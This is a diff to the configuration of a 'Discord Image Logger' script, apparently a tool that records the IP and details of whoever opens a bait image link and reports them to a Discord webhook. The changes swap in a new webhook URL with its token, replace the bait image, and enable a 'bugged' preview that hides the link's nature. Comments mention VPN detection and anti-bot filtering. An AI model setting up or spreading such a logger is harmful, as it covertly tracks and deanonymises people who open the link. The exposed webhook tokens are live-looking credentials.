@@ -1,3 +1,4 @@
+
 # Discord Image Logger
 # By KUPAL
 
@@ -12,8 +13,8 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
-    "image": "https://media.discordapp.net/attachments/1302379386997309492/1355324047088423043/301eafcf6eda5559e76be6418dea0652.webp?ex=67e88361&is=67e731e1&hm=102bd11caf4c5d9c9138bc1c526ab50a00b706c1f58a3dd2e64e58ac50246cae&=&format=webp", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1356695606667776287/KaM6O9LANZpCLNjxwCMJA9AfCHdWbze2JdMb2vjThHn8FEYKvE5f2Ni6CVmB3fPeU7xX",
+    "image": "https://cdn.discordapp.com/attachments/1233881503923179572/1353909011480838196/Evil_cat.jpg?ex=67ed40c6&is=67ebef46&hm=a001879087729ece146771bad47415de0c753c89d62a50bc2684ab6f0142dbb0&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -38,7 +39,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
